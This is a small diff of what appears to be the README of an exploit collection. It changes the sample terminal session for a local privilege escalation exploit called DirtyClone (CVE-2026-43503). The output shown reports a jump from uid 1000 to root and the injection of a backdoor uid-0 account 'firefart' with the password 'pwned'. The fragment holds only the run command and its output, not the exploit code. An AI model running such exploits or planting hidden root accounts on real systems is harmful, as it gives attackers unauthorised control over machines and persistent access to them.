@@ -359,7 +359,7 @@ uid=0(root) gid=0(root) groups=0(root),27(sudo),100(users),1001(user)
 ## 💀 DirtyClone
 
 ```
-osboxes@ubuntu2204:~$ python3 dc.py
+osboxes@ubuntu2204:~/fullEx$ ./fullEx.sh -DirtyClone
 [*] CVE-2026-43503 (DirtyClone) local privilege escalation
 [*] uid=1000 -> root
 [+] injected uid 0 account 'firefart' (password: pwned)
